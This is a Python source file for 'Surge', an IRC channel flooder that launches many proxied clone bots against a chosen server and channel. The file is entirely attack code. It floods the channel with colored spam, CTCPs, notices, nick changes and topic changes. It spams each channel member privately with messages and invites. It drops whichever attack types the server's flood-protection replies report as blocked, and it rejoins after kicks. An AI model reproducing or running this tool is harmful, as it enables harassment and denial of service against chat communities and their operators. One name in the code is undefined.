#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Surge IRC Channel Flooder
# Developed by acidvegas in Python 3
# https://github.com/acidvegas/trollbots
# surge.py

import concurrent.futures
import os
import random
import ssl
import socket
import sys
import threading
import time

sys.dont_write_bytecode = True

import config

# Globals
proxy_file = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'proxies.txt')

def alert(msg):
    print(f'{get_time()} | [+] - {msg}')

def debug(msg):
    print(f'{get_time()} | [~] - {msg}')

def error(msg, reason=None):
    if reason:
        print(f'{get_time()} | [!] - {msg} ({reason})')
    else:
        print(f'{get_time()} | [!] - {msg}')

def error_exit(msg):
    raise SystemExit(f'{get_time()} | [!] - {msg}')

def get_time():
    return time.strftime('%I:%M:%S')

def keep_alive():
    try:
        while True:
            input('')
    except KeyboardInterrupt:
        sys.exit()

def random_int(min, max):
    return random.randint(min, max)

def random_str(size):
    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(size))

class clone:
    def __init__(self, proxy):
        self.attacks_channel  = ['action','color','ctcp','msg','nick','notice','part','topic']
        self.attacks_nicklist = ['ctcp','invite','private']
        self.connected        = False
        self.invite_channel   = '#' + random_str(random_int(5,8))
        self.nickname         = random_str(random_int(5,8))
        self.proxy_server     = proxy.split(':')[0]
        self.proxy_port       = int(proxy.split(':')[1])
        self.nicklist         = []
        self.sock             = None

    def run(self):
        self.connect()

    def action(self, chan, msg):
        self.sendmsg(chan, f'\x01ACTION {msg}\x01')

    def attack_channel(self):
        while True:
            if not self.connected:
                break
            elif not self.nicklist:
                pass
            elif not self.attacks_channel:
                error('Failed to attack channel!', 'Channel attack list is empty.')
                break
            else:
                try:
                    option  = random.choice(self.attacks_channel)
                    if option in ('nick','part','topic'):
                        if option == 'nick':
                            self.nickname = random_str(random_int(5,8))
                            self.nick(self.nickname)
                        elif option == 'part':
                            self.part(config.channel, config.message)
                            time.sleep(config.rejoin_delay)
                            self.join_channel(config.channel)
                        elif option == 'topic':
                            self.topic(config.channel, '{0} {1} {2}'.format(random_str(random_int(5,10)), config.message, random_str(random_int(5, 10))))
                    else:
                        message = self.rainbow('{0}: {1}'.format(random.choice(self.nicklist), config.message))
                        if option == 'action':
                            self.action(config.channel, message)
                        elif option == 'ctcp':
                            self.ctcp(config.channel, message)
                        elif option == 'msg':
                            self.sendmsg(config.channel, message)
                        elif option == 'notice':
                            self.notice(config.channel, message)
                    time.sleep(config.attack_delay)
                except:
                    break

    def attack_nicklist(self):
        while True:
            if not self.connected:
                break
            elif not self.nicklist:
                pass
            elif not self.attacks_channel:
                error('Failed to attack nicklist!', 'Nicklist attack list is empty.')
                pass
            else:
                try:
                    for name in self.nicklist:
                        option = random.choice(self.attacks_nicklist)
                        if option == 'ctcp':
                            self.ctcp(name, random.choice(('PING','TIME','VERSION')))
                        elif option == 'invite':
                            self.invite(name,  self.invite_channel)
                        elif option == 'private':
                            self.sendmsg(name, self.rainbow(config.message))
                        time.sleep(config.attack_delay)
                except:
                    break

    def connect(self):
        try:
            self.create_socket()
            self.sock.connect((config.server, config.port))
            if config.password:
                self.raw('PASS ' + config.password)
            self.raw('USER {0} 0 * :{1}'.format(random_str(random_int(5,8)), random_str(random_int(5,8))))
            self.nick(self.nickname)
        except:
            self.event_disconnect()
        else:
            self.listen()

    def create_socket(self):
        if config.use_ipv6:
            self.sock = socks.socksocket(socket.AF_INET6, socket.SOCK_STREAM)
        else:
            self.sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setblocking(0)
        self.sock.settimeout(config.timeout)
        self.sock.setproxy(socks.PROXY_TYPE_SOCKS5, self.proxy_server, self.proxy_port)
        if config.use_ssl:
            self.sock = ssl.wrap_socket(self.sock)

    def ctcp(self, target, data):
        self.sendmsg(target, f'\001{data}\001')

    def event_connect(self):
        alert(f'Successful connection. ({self.proxy_server}:{self.proxy_port})')
        self.connected = True
        self.join_channel(config.channel, config.key)
        self.join_channel(self.invite_channel)

    def event_disconnect(self):
        self.connected = False
        self.sock.close()

    def event_end_of_names(self):
        threading.Thread(target=self.attack_channel).start()
        threading.Thread(target=self.attack_nicklist).start()

    def event_kick(self, chan, kicked):
        if kicked == self.nickname:
            time.sleep(config.rejoin_delay)
            self.join_channel(config.channel, config.key)

    def event_names(self, chan, names):
        for name in names:
            if name[:1] in '~!@%&+:':
                name = name[1:]
            if name != self.nickname and name not in self.nicklist:
                self.nicklist.append(name)

    def event_nick_in_use(self):
        self.nickname = random_str(random_int(5,8))
        self.nick(self.nickname)

    def event_quit(self, nick):
        if nick in self.nicklist:
            self.nicklist.remove(nick)

    def handle_events(self, data):
        args = data.split()
        if args[0] == 'PING':
            self.raw('PONG ' + args[1][1:])
        elif args[1] == '001':
            self.event_connect()
        elif args[1] == '353':
            chan = args[4]
            if ' :' in data:
                names = data.split(' :')[1].split()
            elif ' *' in data:
                names = data.split(' *')[1].split()
            elif ' =' in data:
                names = data.split(' =')[1].split()
            else:
                names = data.split(chan)[1].split()
            self.event_names(chan, names)
        elif args[1] == '366':
            self.event_end_of_names()
        elif args[1] == '401':
            name = args[3]
            if name in self.nicklist:
                self.nicklist.remove(name)
        elif args[1] == '404':
            if 'ACTIONs are not permitted' in data:
                if 'action' in self.attacks_channel:
                    self.attacks_channel.remove('action')
            elif 'Color is not permitted' in data:
                if 'color' in self.attacks_channel:
                    self.attacks_channel.remove('color')
            elif 'CTCPs are not permitted' in data:
                if 'ctcp' in self.attacks_channel:
                    self.attacks_channel.remove('ctcp')
            elif 'You need voice' in data or 'You must have a registered nick' in data:
                if 'action' in self.attacks_channel:
                    self.attacks_channel.remove('action')
                elif 'ctcp' in self.attacks_channel:
                    self.attacks_channel.remove('ctcp')
                elif 'msg' in self.attacks_channel:
                    self.attacks_channel.remove('msg')
                elif 'notice' in self.attacks_channel:
                    self.attacks_channel.remove('notice')
                elif 'topic' in self.attacks_channel:
                    self.attacks_channel.remove('topic')
            elif 'NOTICEs are not permitted' in data:
                if 'notice' in self.attacks_channel:
                    self.attacks_channel.remove('notice')
        elif args[1] == '433':
            self.event_nick_in_use()
        elif args[1] == '447':
            if 'nick' in self.attacks_channel:
                self.attacks_channel.remove('nick')
        elif args[1] == '482':
            if 'topic' in self.attacks_channel:
                self.attacks_channel.remove('topic')
        elif args[1] == '492':
            if 'ctcp' in self.attacks_nicklist:
                self.attacks_nicklist.remove('ctcp')
        elif args[1] == '499':
            if 'topic' in self.attacks_channel:
                self.attacks_channel.remove('topic')
        elif args[1] == '518':
            if 'invite' in self.attacks_nicklist:
                self.attacks_nicklist.remove('invite')
        elif args[1] in config.bad_numerics:
            error('Flood protection has been enabled!', args[1])
            self.event_disconnect()
        elif args[1] == 'KICK':
            chan   = args[2]
            kicked = args[3]
            self.event_kick(chan, kicked)
        elif args[1] == 'QUIT':
            nick = args[0].split('!')[0][1:]
            self.event_quit(nick)

    def invite(self, nick, chan):
        self.raw(f'INVITE {nick} {chan}')

    def join_channel(self, chan, key=None):
        if key:
            self.raw(f'JOIN {chan} {key}')
        else:
            self.raw('JOIN ' + chan)

    def listen(self):
        while True:
            try:
                data = self.sock.recv(1024).decode('utf-8')
                if data:
                    for line in (line for line in data.split('\r\n') if line):
                        if line.startswith('ERROR :Closing Link:'):
                            break
                        elif len(line.split()) >= 2:
                            self.handle_events(line)
                else:
                    break
            except (UnicodeDecodeError,UnicodeEncodeError):
                pass
            except:
                break
        self.event_disconnect()

    def nick(self, nick):
        self.raw('NICK ' + nick)

    def notice(self, target, msg):
        self.raw(f'NOTICE {target} :{msg}')

    def part(self, chan, msg):
        self.raw(f'PART {chan} :{msg}')

    def rainbow(self, msg):
        if config.use_unicode:
            bell_char  = ''
            block_char = '▄'
        else:
            bell_char  = ''
            block_char = ''
        if config.use_color and 'color' in self.attacks_channel:
            message = ''
            for i in range(random_int(10,20)):
                message += '{0}\x03{1:0>2},{2:0>2}{3}'.format(bell_char, random_int(2,13), random_int(2,13), unicode_char)
            message += '{0}\x03{1:0>2} {2} '.format(bell_char, random_int(2,13), msg)
            for i in range(random_int(10,20)):
                message += '{0}\x03{1:0>2},{2:0>2}{3}'.format(bell_char, random_int(2,13), random_int(2,13), unicode_char)
        else:
            message = '{0} {1} {2}'.format(random_str(random_int(10,20)), msg, random_str(random_int(10,20)))
        return message

    def raw(self, msg):
        self.sock.send(bytes(msg + '\r\n', 'utf-8'))

    def sendmsg(self, target, msg):
        self.raw(f'PRIVMSG {target} :{msg}')

    def topic(self, chan, text):
        self.raw(f'TOPIC {chan} :{text}')

# Main
print(''.rjust(56, '#'))
print('#{0}#'.format(''.center(54)))
print('#{0}#'.format('Surge IRC Channel Flooder'.center(54)))
print('#{0}#'.format('Developed by acidvegas in Python 3'.center(54)))
print('#{0}#'.format('https://github.com/acidvegas/trollbots'.center(54)))
print('#{0}#'.format(''.center(54)))
print(''.rjust(56, '#'))
if not sys.version_info.major == 3:
    error_exit('Surge requires Python version 3 to run!')
try:
    import socks
except ImportError:
    error_exit('Missing PySocks module! (https://pypi.python.org/pypi/PySocks)')
if os.path.isfile(proxy_file):
    proxies = [line.strip() for line in open(proxy_file).readlines() if line]
else:
    error_exit('Missing proxies file!')
debug(f'Loaded {len(proxies)} proxies from file.')
random.shuffle(proxies)
for i in range(config.concurrent_connections):
    with concurrent.futures.ThreadPoolExecutor(max_workers=config.max_threads) as executor:
        checks = {executor.submit(clone(proxy).connect): proxy for proxy in proxies}
        for future in concurrent.futures.as_completed(checks):
            checks[future]
debug('Flooding is complete. (Threads still may be running!)')
keep_alive()